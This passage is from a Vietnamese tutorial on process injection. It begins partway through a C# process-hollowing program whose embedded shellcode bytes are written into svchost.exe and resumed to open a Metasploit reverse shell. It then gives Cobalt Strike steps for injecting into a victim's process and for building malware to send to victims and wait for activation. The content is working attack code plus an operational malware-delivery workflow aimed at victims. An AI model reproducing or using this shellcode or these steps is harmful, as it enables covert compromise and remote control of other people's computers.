0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,
0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,
0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,
0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,
0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,
0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,
0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,
0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,
0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            ResumeThread(pi.hThread);
        }
    }
}
```


##### Bước 6. Biên dịch và thực thi

![](https://images.viblo.asia/a1e633dc-5913-436a-b4dc-159d1f392824.png)

Lắng nghe trên Metasploit Framework

[![2msScreenshot_6.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/2msScreenshot_6.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/2msScreenshot_6.png)


Cuối cùng ta đã Injection payload được vào `svchost.exe` với PID 8116


### 3. Process Injection với CobaltStrike

Process Injection là một tính năng được tính hợp sẵn trong CobalStrike với cách dùng từ đơn giản tới phức tạp

#### 3.1. Thực hiện với mục đích Post-Exploit (Tức là ta đã có kết nối với nạn nhân từ trước).

Ta chỉ cần thao tác trên Beacon. Tiến hành  demo theo các bước sau :

1.  Tạo mã độc với CobalStrile (Với Process x64 phải chọn payload x64)

2. Thực thi mã độc trên máy nạn nhân (phải có bước này trước)

3. Tiến hành Process Injection

[![3KEScreenshot_7.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/3KEScreenshot_7.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/3KEScreenshot_7.png)

Một danh sách PID hệ thống hiện ta, ta tiến hành inject vào process 


Ngay sau khi inject thành công, chúng ta sẽ nhận về một reverse shell mới, Shell này được thực thi với PID của Process chúng ta đã chọn

[![M0wScreenshot_6.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/M0wScreenshot_6.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/M0wScreenshot_6.png)

#### 3.2 Sử dụng kỹ thuật Process Injection trong việc phát triển Malware 

1. Tạo Shellcode C#  với CobalStrile

2. Insert Shellcode vào mã Process Hollowing bên trên và biên dịch 

[![E8uScreenshot_2.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/E8uScreenshot_2.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/E8uScreenshot_2.png)

3. Gửi mã độc cho nạn nhân và chờ kích hoạt 

[![eiQScreenshot_5.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/eiQScreenshot_5.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/eiQScreenshot_5.png)

Hoặc có thể sử dụng `Malleable Command and Control` theo hướng dẫn sau https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_main.htm